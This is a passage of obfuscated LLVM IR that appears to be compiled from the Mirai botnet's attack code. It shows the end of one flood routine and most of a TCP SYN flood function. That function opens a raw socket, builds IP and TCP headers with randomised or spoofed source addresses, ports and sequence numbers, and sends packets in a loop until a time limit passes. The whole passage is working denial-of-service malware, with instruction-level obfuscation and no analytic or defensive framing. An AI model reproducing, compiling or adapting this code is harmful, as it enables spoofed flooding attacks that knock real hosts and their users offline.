  %604 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %605 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %606 = load i32, i32* %11, align 4
  %607 = sext i32 %606 to i64
  %608 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %605, i64 %607
  %609 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %608, i32 0, i32 0
  %610 = bitcast %struct.sockaddr_in* %609 to %struct.sockaddr*
  store %struct.sockaddr* %610, %struct.sockaddr** %604, align 8
  %611 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %612 = load %struct.sockaddr*, %struct.sockaddr** %611, align 8
  %613 = call i64 @sendto(i32 %595, i8* %596, i64 %602, i32 16384, %struct.sockaddr* %612, i32 16)
  br label %614

; <label>:614:                                    ; preds = %539
  %615 = load i32, i32* %11, align 4
  %616 = sub i32 %615, 206843670
  %617 = add i32 %616, 1
  %618 = add i32 %617, 206843670
  %619 = add nsw i32 %615, 1
  store i32 %618, i32* %11, align 4
  br label %359

; <label>:620:                                    ; preds = %359
  %621 = call i64 @time(i64* null) #6
  %622 = load i32, i32* %24, align 4
  %623 = sext i32 %622 to i64
  %624 = icmp sgt i64 %621, %623
  br i1 %624, label %625, label %626

; <label>:625:                                    ; preds = %620
  br label %627

; <label>:626:                                    ; preds = %620
  br label %358

; <label>:627:                                    ; preds = %625, %102, %96
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_syn(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i8, align 1
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca %struct.iphdr*, align 8
  %31 = alloca %struct.tcphdr*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca i8*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %37 = load i8, i8* %7, align 1
  %38 = zext i8 %37 to i64
  %39 = call noalias i8* @calloc(i64 %38, i64 8) #6
  %40 = bitcast i8* %39 to i8**
  store i8** %40, i8*** %13, align 8
  %41 = load i8, i8* %9, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 2, i32 0)
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %14, align 1
  %45 = load i8, i8* %9, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 3, i32 65535)
  %48 = trunc i32 %47 to i16
  store i16 %48, i16* %15, align 2
  %49 = load i8, i8* %9, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 4, i32 64)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %16, align 1
  %53 = load i8, i8* %9, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 5, i32 1)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %17, align 1
  %57 = load i8, i8* %9, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 6, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %18, align 2
  %61 = load i8, i8* %9, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 7, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %19, align 2
  %65 = load i8, i8* %9, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 16, i32 65535)
  store i32 %67, i32* %20, align 4
  %68 = load i8, i8* %9, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 17, i32 0)
  store i32 %70, i32* %21, align 4
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 10, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %22, align 1
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 11, i32 0)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %23, align 1
  %79 = load i8, i8* %9, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 12, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %24, align 1
  %83 = load i8, i8* %9, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 13, i32 0)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %25, align 1
  %87 = load i8, i8* %9, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 14, i32 1)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %26, align 1
  %91 = load i8, i8* %9, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 15, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %27, align 1
  %95 = load i8, i8* %9, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %97 = load i32, i32* @LOCAL_ADDR, align 4
  %98 = call i32 @attack_get_opt_ip(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 24, i32 %97)
  store i32 %98, i32* %28, align 4
  %99 = call i64 @time(i64* null) #6
  %100 = load i32, i32* %6, align 4
  %101 = sext i32 %100 to i64
  %102 = add i64 %99, -5705121171441088472
  %103 = add i64 %102, %101
  %104 = sub i64 %103, -5705121171441088472
  %105 = add nsw i64 %99, %101
  %106 = trunc i64 %104 to i32
  store i32 %106, i32* %29, align 4
  %107 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %107, i32* %12, align 4
  %108 = icmp eq i32 %107, -1
  br i1 %108, label %109, label %110

; <label>:109:                                    ; preds = %5
  br label %624

; <label>:110:                                    ; preds = %5
  store i32 1, i32* %11, align 4
  %111 = load i32, i32* %12, align 4
  %112 = bitcast i32* %11 to i8*
  %113 = call i32 @setsockopt(i32 %111, i32 0, i32 3, i8* %112, i32 4) #6
  %114 = icmp eq i32 %113, -1
  br i1 %114, label %115, label %118

; <label>:115:                                    ; preds = %110
  %116 = load i32, i32* %12, align 4
  %117 = call i32 @close(i32 %116)
  br label %624

; <label>:118:                                    ; preds = %110
  store i32 0, i32* %11, align 4
  br label %119

; <label>:119:                                    ; preds = %443, %118
  %120 = load i32, i32* %11, align 4
  %121 = load i8, i8* %7, align 1
  %122 = zext i8 %121 to i32
  %123 = icmp slt i32 %120, %122
  br i1 %123, label %124, label %448

; <label>:124:                                    ; preds = %119
  %125 = call noalias i8* @calloc(i64 128, i64 1) #6
  %126 = load i8**, i8*** %13, align 8
  %127 = load i32, i32* %11, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds i8*, i8** %126, i64 %128
  store i8* %125, i8** %129, align 8
  %130 = load i8**, i8*** %13, align 8
  %131 = load i32, i32* %11, align 4
  %132 = sext i32 %131 to i64
  %133 = getelementptr inbounds i8*, i8** %130, i64 %132
  %134 = load i8*, i8** %133, align 8
  %135 = bitcast i8* %134 to %struct.iphdr*
  store %struct.iphdr* %135, %struct.iphdr** %30, align 8
  %136 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %137 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %136, i64 1
  %138 = bitcast %struct.iphdr* %137 to %struct.tcphdr*
  store %struct.tcphdr* %138, %struct.tcphdr** %31, align 8
  %139 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %140 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %139, i64 1
  %141 = bitcast %struct.tcphdr* %140 to i8*
  store i8* %141, i8** %32, align 8
  %142 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %143 = bitcast %struct.iphdr* %142 to i8*
  %144 = load i8, i8* %143, align 4
  %145 = xor i8 %144, -1
  %146 = xor i8 15, -1
  %147 = xor i8 -62, -1
  %148 = or i8 %145, %146
  %149 = or i8 -62, %147
  %150 = xor i8 %148, -1
  %151 = and i8 %150, %149
  %152 = and i8 %144, 15
  %153 = and i8 %151, 64
  %154 = xor i8 %151, 64
  %155 = or i8 %153, %154
  %156 = or i8 %151, 64
  store i8 %155, i8* %143, align 4
  %157 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %158 = bitcast %struct.iphdr* %157 to i8*
  %159 = load i8, i8* %158, align 4
  %160 = xor i8 -16, -1
  %161 = xor i8 %159, %160
  %162 = and i8 %161, %159
  %163 = and i8 %159, -16
  %164 = and i8 %162, 5
  %165 = xor i8 %162, 5
  %166 = or i8 %164, %165
  %167 = or i8 %162, 5
  store i8 %166, i8* %158, align 4
  %168 = load i8, i8* %14, align 1
  %169 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i32 0, i32 1
  store i8 %168, i8* %170, align 1
  %171 = call zeroext i16 @htons(i16 zeroext 60) #7
  %172 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %173 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %172, i32 0, i32 2
  store i16 %171, i16* %173, align 2
  %174 = load i16, i16* %15, align 2
  %175 = call zeroext i16 @htons(i16 zeroext %174) #7
  %176 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 3
  store i16 %175, i16* %177, align 4
  %178 = load i8, i8* %16, align 1
  %179 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 5
  store i8 %178, i8* %180, align 4
  %181 = load i8, i8* %17, align 1
  %182 = icmp ne i8 %181, 0
  br i1 %182, label %183, label %187

; <label>:183:                                    ; preds = %124
  %184 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %185 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %186 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %185, i32 0, i32 4
  store i16 %184, i16* %186, align 2
  br label %187

; <label>:187:                                    ; preds = %183, %124
  %188 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %189 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %188, i32 0, i32 6
  store i8 6, i8* %189, align 1
  %190 = load i32, i32* %28, align 4
  %191 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %192 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %191, i32 0, i32 8
  store i32 %190, i32* %192, align 4
  %193 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %194 = load i32, i32* %11, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %193, i64 %195
  %197 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %196, i32 0, i32 1
  %198 = load i32, i32* %197, align 4
  %199 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %200 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %199, i32 0, i32 9
  store i32 %198, i32* %200, align 4
  %201 = load i16, i16* %18, align 2
  %202 = call zeroext i16 @htons(i16 zeroext %201) #7
  %203 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %204 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %203, i32 0, i32 0
  store i16 %202, i16* %204, align 4
  %205 = load i16, i16* %19, align 2
  %206 = call zeroext i16 @htons(i16 zeroext %205) #7
  %207 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %208 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %207, i32 0, i32 1
  store i16 %206, i16* %208, align 2
  %209 = load i32, i32* %20, align 4
  %210 = trunc i32 %209 to i16
  %211 = call zeroext i16 @htons(i16 zeroext %210) #7
  %212 = zext i16 %211 to i32
  %213 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %214 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %213, i32 0, i32 2
  store i32 %212, i32* %214, align 4
  %215 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %216 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %215, i32 0, i32 4
  %217 = load i16, i16* %216, align 4
  %218 = xor i16 -241, -1
  %219 = xor i16 %217, %218
  %220 = and i16 %219, %217
  %221 = and i16 %217, -241
  %222 = xor i16 %220, -1
  %223 = xor i16 160, -1
  %224 = xor i16 16036, -1
  %225 = and i16 %222, 16036
  %226 = and i16 %220, %224
  %227 = and i16 %223, 16036
  %228 = and i16 160, %224
  %229 = or i16 %225, %226
  %230 = or i16 %227, %228
  %231 = xor i16 %229, %230
  %232 = or i16 %222, %223
  %233 = xor i16 %232, -1
  %234 = or i16 16036, %224
  %235 = and i16 %233, %234
  %236 = or i16 %231, %235
  %237 = or i16 %220, 160
  store i16 %236, i16* %216, align 4
  %238 = load i8, i8* %22, align 1
  %239 = sext i8 %238 to i16
  %240 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %241 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %240, i32 0, i32 4
  %242 = load i16, i16* %241, align 4
  %243 = xor i16 1, -1
  %244 = xor i16 %239, %243
  %245 = and i16 %244, %239
  %246 = and i16 %239, 1
  %247 = shl i16 %245, 13
  %248 = xor i16 %242, -1
  %249 = xor i16 -8193, -1
  %250 = xor i16 -28253, -1
  %251 = or i16 %248, %249
  %252 = or i16 -28253, %250
  %253 = xor i16 %251, -1
  %254 = and i16 %253, %252
  %255 = and i16 %242, -8193
  %256 = xor i16 %254, -1
  %257 = xor i16 %247, -1
  %258 = xor i16 -31036, -1
  %259 = and i16 %256, -31036
  %260 = and i16 %254, %258
  %261 = and i16 %257, -31036
  %262 = and i16 %247, %258
  %263 = or i16 %259, %260
  %264 = or i16 %261, %262
  %265 = xor i16 %263, %264
  %266 = or i16 %256, %257
  %267 = xor i16 %266, -1
  %268 = or i16 -31036, %258
  %269 = and i16 %267, %268
  %270 = or i16 %265, %269
  %271 = or i16 %254, %247
  store i16 %270, i16* %241, align 4
  %272 = load i8, i8* %23, align 1
  %273 = sext i8 %272 to i16
  %274 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %275 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %274, i32 0, i32 4
  %276 = load i16, i16* %275, align 4
  %277 = xor i16 %273, -1
  %278 = xor i16 1, -1
  %279 = xor i16 9267, -1
  %280 = or i16 %277, %278
  %281 = or i16 9267, %279
  %282 = xor i16 %280, -1
  %283 = and i16 %282, %281
  %284 = and i16 %273, 1
  %285 = shl i16 %283, 12
  %286 = xor i16 -4097, -1
  %287 = xor i16 %276, %286
  %288 = and i16 %287, %276
  %289 = and i16 %276, -4097
  %290 = and i16 %288, %285
  %291 = xor i16 %288, %285
  %292 = or i16 %290, %291
  %293 = or i16 %288, %285
  store i16 %292, i16* %275, align 4
  %294 = load i8, i8* %24, align 1
  %295 = sext i8 %294 to i16
  %296 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %297 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %296, i32 0, i32 4
  %298 = load i16, i16* %297, align 4
  %299 = xor i16 1, -1
  %300 = xor i16 %295, %299
  %301 = and i16 %300, %295
  %302 = and i16 %295, 1
  %303 = shl i16 %301, 11
  %304 = xor i16 -2049, -1
  %305 = xor i16 %298, %304
  %306 = and i16 %305, %298
  %307 = and i16 %298, -2049
  %308 = and i16 %306, %303
  %309 = xor i16 %306, %303
  %310 = or i16 %308, %309
  %311 = or i16 %306, %303
  store i16 %310, i16* %297, align 4
  %312 = load i8, i8* %25, align 1
  %313 = sext i8 %312 to i16
  %314 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %315 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %314, i32 0, i32 4
  %316 = load i16, i16* %315, align 4
  %317 = xor i16 %313, -1
  %318 = xor i16 1, -1
  %319 = xor i16 -1779, -1
  %320 = or i16 %317, %318
  %321 = or i16 -1779, %319
  %322 = xor i16 %320, -1
  %323 = and i16 %322, %321
  %324 = and i16 %313, 1
  %325 = shl i16 %323, 10
  %326 = xor i16 -1025, -1
  %327 = xor i16 %316, %326
  %328 = and i16 %327, %316
  %329 = and i16 %316, -1025
  %330 = xor i16 %328, -1
  %331 = xor i16 %325, -1
  %332 = xor i16 -19909, -1
  %333 = and i16 %330, -19909
  %334 = and i16 %328, %332
  %335 = and i16 %331, -19909
  %336 = and i16 %325, %332
  %337 = or i16 %333, %334
  %338 = or i16 %335, %336
  %339 = xor i16 %337, %338
  %340 = or i16 %330, %331
  %341 = xor i16 %340, -1
  %342 = or i16 -19909, %332
  %343 = and i16 %341, %342
  %344 = or i16 %339, %343
  %345 = or i16 %328, %325
  store i16 %344, i16* %315, align 4
  %346 = load i8, i8* %26, align 1
  %347 = sext i8 %346 to i16
  %348 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %349 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %348, i32 0, i32 4
  %350 = load i16, i16* %349, align 4
  %351 = xor i16 %347, -1
  %352 = xor i16 1, -1
  %353 = xor i16 -5778, -1
  %354 = or i16 %351, %352
  %355 = or i16 -5778, %353
  %356 = xor i16 %354, -1
  %357 = and i16 %356, %355
  %358 = and i16 %347, 1
  %359 = shl i16 %357, 9
  %360 = xor i16 -513, -1
  %361 = xor i16 %350, %360
  %362 = and i16 %361, %350
  %363 = and i16 %350, -513
  %364 = and i16 %362, %359
  %365 = xor i16 %362, %359
  %366 = or i16 %364, %365
  %367 = or i16 %362, %359
  store i16 %366, i16* %349, align 4
  %368 = load i8, i8* %27, align 1
  %369 = sext i8 %368 to i16
  %370 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %371 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %370, i32 0, i32 4
  %372 = load i16, i16* %371, align 4
  %373 = xor i16 1, -1
  %374 = xor i16 %369, %373
  %375 = and i16 %374, %369
  %376 = and i16 %369, 1
  %377 = shl i16 %375, 8
  %378 = xor i16 -257, -1
  %379 = xor i16 %372, %378
  %380 = and i16 %379, %372
  %381 = and i16 %372, -257
  %382 = xor i16 %380, -1
  %383 = xor i16 %377, -1
  %384 = xor i16 -9191, -1
  %385 = and i16 %382, -9191
  %386 = and i16 %380, %384
  %387 = and i16 %383, -9191
  %388 = and i16 %377, %384
  %389 = or i16 %385, %386
  %390 = or i16 %387, %388
  %391 = xor i16 %389, %390
  %392 = or i16 %382, %383
  %393 = xor i16 %392, -1
  %394 = or i16 -9191, %384
  %395 = and i16 %393, %394
  %396 = or i16 %391, %395
  %397 = or i16 %380, %377
  store i16 %396, i16* %371, align 4
  %398 = load i8*, i8** %32, align 8
  %399 = getelementptr inbounds i8, i8* %398, i32 1
  store i8* %399, i8** %32, align 8
  store i8 2, i8* %398, align 1
  %400 = load i8*, i8** %32, align 8
  %401 = getelementptr inbounds i8, i8* %400, i32 1
  store i8* %401, i8** %32, align 8
  store i8 4, i8* %400, align 1
  %402 = call i32 @rand_next()
  %403 = xor i32 15, -1
  %404 = xor i32 %402, %403
  %405 = and i32 %404, %402
  %406 = and i32 %402, 15
  %407 = sub i32 0, 1400
  %408 = sub i32 0, %405
  %409 = add i32 %407, %408
  %410 = sub i32 0, %409
  %411 = add i32 1400, %405
  %412 = trunc i32 %410 to i16
  %413 = call zeroext i16 @htons(i16 zeroext %412) #7
  %414 = load i8*, i8** %32, align 8
  %415 = bitcast i8* %414 to i16*
  store i16 %413, i16* %415, align 2
  %416 = load i8*, i8** %32, align 8
  %417 = getelementptr inbounds i8, i8* %416, i64 2
  store i8* %417, i8** %32, align 8
  %418 = load i8*, i8** %32, align 8
  %419 = getelementptr inbounds i8, i8* %418, i32 1
  store i8* %419, i8** %32, align 8
  store i8 4, i8* %418, align 1
  %420 = load i8*, i8** %32, align 8
  %421 = getelementptr inbounds i8, i8* %420, i32 1
  store i8* %421, i8** %32, align 8
  store i8 2, i8* %420, align 1
  %422 = load i8*, i8** %32, align 8
  %423 = getelementptr inbounds i8, i8* %422, i32 1
  store i8* %423, i8** %32, align 8
  store i8 8, i8* %422, align 1
  %424 = load i8*, i8** %32, align 8
  %425 = getelementptr inbounds i8, i8* %424, i32 1
  store i8* %425, i8** %32, align 8
  store i8 10, i8* %424, align 1
  %426 = call i32 @rand_next()
  %427 = load i8*, i8** %32, align 8
  %428 = bitcast i8* %427 to i32*
  store i32 %426, i32* %428, align 4
  %429 = load i8*, i8** %32, align 8
  %430 = getelementptr inbounds i8, i8* %429, i64 4
  store i8* %430, i8** %32, align 8
  %431 = load i8*, i8** %32, align 8
  %432 = bitcast i8* %431 to i32*
  store i32 0, i32* %432, align 4
  %433 = load i8*, i8** %32, align 8
  %434 = getelementptr inbounds i8, i8* %433, i64 4
  store i8* %434, i8** %32, align 8
  %435 = load i8*, i8** %32, align 8
  %436 = getelementptr inbounds i8, i8* %435, i32 1
  store i8* %436, i8** %32, align 8
  store i8 1, i8* %435, align 1
  %437 = load i8*, i8** %32, align 8
  %438 = getelementptr inbounds i8, i8* %437, i32 1
  store i8* %438, i8** %32, align 8
  store i8 3, i8* %437, align 1
  %439 = load i8*, i8** %32, align 8
  %440 = getelementptr inbounds i8, i8* %439, i32 1
  store i8* %440, i8** %32, align 8
  store i8 3, i8* %439, align 1
  %441 = load i8*, i8** %32, align 8
  %442 = getelementptr inbounds i8, i8* %441, i32 1
  store i8* %442, i8** %32, align 8
  store i8 6, i8* %441, align 1
  br label %443

; <label>:443:                                    ; preds = %187
  %444 = load i32, i32* %11, align 4
  %445 = sub i32 0, 1
  %446 = sub i32 %444, %445
  %447 = add nsw i32 %444, 1
  store i32 %446, i32* %11, align 4
  br label %119

; <label>:448:                                    ; preds = %119
  br label %449

; <label>:449:                                    ; preds = %623, %448
  store i32 0, i32* %11, align 4
  br label %450

; <label>:450:                                    ; preds = %612, %449
  %451 = load i32, i32* %11, align 4
  %452 = load i8, i8* %7, align 1
  %453 = zext i8 %452 to i32
  %454 = icmp slt i32 %451, %453
  br i1 %454, label %455, label %617

; <label>:455:                                    ; preds = %450
  %456 = load i8**, i8*** %13, align 8
  %457 = load i32, i32* %11, align 4
  %458 = sext i32 %457 to i64
  %459 = getelementptr inbounds i8*, i8** %456, i64 %458
  %460 = load i8*, i8** %459, align 8
  store i8* %460, i8** %33, align 8
  %461 = load i8*, i8** %33, align 8
  %462 = bitcast i8* %461 to %struct.iphdr*
  store %struct.iphdr* %462, %struct.iphdr** %34, align 8
  %463 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %464 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %463, i64 1
  %465 = bitcast %struct.iphdr* %464 to %struct.tcphdr*
  store %struct.tcphdr* %465, %struct.tcphdr** %35, align 8
  %466 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %467 = load i32, i32* %11, align 4
  %468 = sext i32 %467 to i64
  %469 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %466, i64 %468
  %470 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %469, i32 0, i32 2
  %471 = load i8, i8* %470, align 4
  %472 = zext i8 %471 to i32
  %473 = icmp slt i32 %472, 32
  br i1 %473, label %474, label %498

; <label>:474:                                    ; preds = %455
  %475 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %476 = load i32, i32* %11, align 4
  %477 = sext i32 %476 to i64
  %478 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %475, i64 %477
  %479 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %478, i32 0, i32 1
  %480 = load i32, i32* %479, align 4
  %481 = call i32 @ntohl(i32 %480) #7
  %482 = call i32 @rand_next()
  %483 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %484 = load i32, i32* %11, align 4
  %485 = sext i32 %484 to i64
  %486 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %483, i64 %485
  %487 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %486, i32 0, i32 2
  %488 = load i8, i8* %487, align 4
  %489 = zext i8 %488 to i32
  %490 = lshr i32 %482, %489
  %491 = sub i32 %481, -1506106146
  %492 = add i32 %491, %490
  %493 = add i32 %492, -1506106146
  %494 = add i32 %481, %490
  %495 = call i32 @htonl(i32 %493) #7
  %496 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %497 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %496, i32 0, i32 9
  store i32 %495, i32* %497, align 4
  br label %498

; <label>:498:                                    ; preds = %474, %455
  %499 = load i32, i32* %28, align 4
  %500 = icmp eq i32 %499, -1
  br i1 %500, label %501, label %505

; <label>:501:                                    ; preds = %498
  %502 = call i32 @rand_next()
  %503 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %504 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %503, i32 0, i32 8
  store i32 %502, i32* %504, align 4
  br label %505

; <label>:505:                                    ; preds = %501, %498
  %506 = load i16, i16* %15, align 2
  %507 = zext i16 %506 to i32
  %508 = icmp eq i32 %507, 65535
  br i1 %508, label %509, label %518

; <label>:509:                                    ; preds = %505
  %510 = call i32 @rand_next()
  %511 = xor i32 65535, -1
  %512 = xor i32 %510, %511
  %513 = and i32 %512, %510
  %514 = and i32 %510, 65535
  %515 = trunc i32 %513 to i16
  %516 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %517 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %516, i32 0, i32 3
  store i16 %515, i16* %517, align 4
  br label %518

; <label>:518:                                    ; preds = %509, %505
  %519 = load i16, i16* %18, align 2
  %520 = zext i16 %519 to i32
  %521 = icmp eq i32 %520, 65535
  br i1 %521, label %522, label %531

; <label>:522:                                    ; preds = %518
  %523 = call i32 @rand_next()
  %524 = xor i32 65535, -1
  %525 = xor i32 %523, %524
  %526 = and i32 %525, %523
  %527 = and i32 %523, 65535
  %528 = trunc i32 %526 to i16
  %529 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %530 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %529, i32 0, i32 0
  store i16 %528, i16* %530, align 4
  br label %531

; <label>:531:                                    ; preds = %522, %518
  %532 = load i16, i16* %19, align 2
  %533 = zext i16 %532 to i32
  %534 = icmp eq i32 %533, 65535
  br i1 %534, label %535, label %544

; <label>:535:                                    ; preds = %531
  %536 = call i32 @rand_next()
  %537 = xor i32 65535, -1
  %538 = xor i32 %536, %537
  %539 = and i32 %538, %536
  %540 = and i32 %536, 65535
  %541 = trunc i32 %539 to i16
  %542 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %543 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %542, i32 0, i32 1
  store i16 %541, i16* %543, align 2
  br label %544

; <label>:544:                                    ; preds = %535, %531
  %545 = load i32, i32* %20, align 4
  %546 = icmp eq i32 %545, 65535
  br i1 %546, label %547, label %551

; <label>:547:                                    ; preds = %544
  %548 = call i32 @rand_next()
  %549 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %550 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %549, i32 0, i32 2
  store i32 %548, i32* %550, align 4
  br label %551

; <label>:551:                                    ; preds = %547, %544
  %552 = load i32, i32* %21, align 4
  %553 = icmp eq i32 %552, 65535
  br i1 %553, label %554, label %558

; <label>:554:                                    ; preds = %551
  %555 = call i32 @rand_next()
  %556 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
